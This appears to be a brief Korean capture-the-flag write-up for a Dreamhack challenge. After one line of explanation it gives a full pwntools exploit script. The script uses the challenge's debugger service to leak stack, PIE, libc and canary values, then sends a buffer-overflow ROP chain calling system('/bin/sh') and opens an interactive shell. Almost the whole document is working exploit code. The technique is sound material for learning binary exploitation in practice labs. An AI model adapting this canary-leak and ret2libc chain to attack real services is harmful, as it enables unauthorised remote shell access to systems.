bof가 터지는데 libc 주소를 모르므로 디버거로 알아내준다. canary는 fs+0x28에 있으므로 알아낼 수 있다.

# Exploit

```python
from pwn import *

p1 = remote("host3.dreamhack.games", 13334)
p = remote("host3.dreamhack.games", 12185)
e = ELF('./ODS-test')
l = ELF('./libc.so.6')

def setbp(addr : int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', hex(addr).encode())

def getreg():
    p.sendlineafter(b'> ', b'2')
    reg = p.recvuntil(b'-------------------------------').split(b'\n')[1:-1]
    return reg

def getdata(addr : int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', hex(addr).encode())
    return p.recvline()

def cont():
    p.sendlineafter(b'> ', b'4')

rsp = getreg()[4].split()[2].decode()
pie_base = int(getdata(int(rsp, 16) + 8 * 41).split()[2].decode(), 16) - 0x2008
rip = getreg()[8].split()[2].decode()
l.address = int(rip, 16) - (0x7ffff7ea7992 - 0x7ffff7d93000)
fs_base = l.address + (0x7ffff7d90740 - 0x7ffff7d93000)
canary = int(getdata(fs_base + 0x28).split()[2].decode(), 16)

ret = pie_base + 0x000000000000101a
system = l.sym['system']
binsh = list(l.search(b'/bin/sh'))[0]
pop_rdi = l.address + 0x000000000002a3e5
payload = b'a' * 0x18 + p64(canary) + b'b' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p1.sendline(payload)
cont()
p1.interactive()

```